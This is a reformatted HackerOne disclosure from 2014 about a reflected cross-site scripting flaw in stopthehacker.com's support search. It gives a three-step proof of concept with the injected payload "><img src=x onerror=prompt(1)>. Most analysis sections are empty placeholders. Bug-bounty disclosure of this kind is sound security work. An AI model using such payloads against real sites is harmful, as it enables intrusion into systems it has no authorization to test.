# XSS in Stopthehacker support

## Metadata
- **Source:** HackerOne
- **Report:** 8862 | https://hackerone.com/reports/8862
- **Submitted:** 2014-04-21
- **Reporter:** cliantech
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

1. go to http://www.stopthehacker.com/support/
2. input "><img src=x onerror=prompt(1)> in the search box (use firefox)
3. A prompt box will appear. XSSed.

Thank you sir.

Clifford


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

1. go to http://www.stopthehacker.com/support/
2. input "><img src=x onerror=prompt(1)> in the search box (use firefox)
3. A prompt box will appear. XSSed.

Thank you sir.

Clifford


</details>

---
*Analysed by Claude on 2026-05-24*
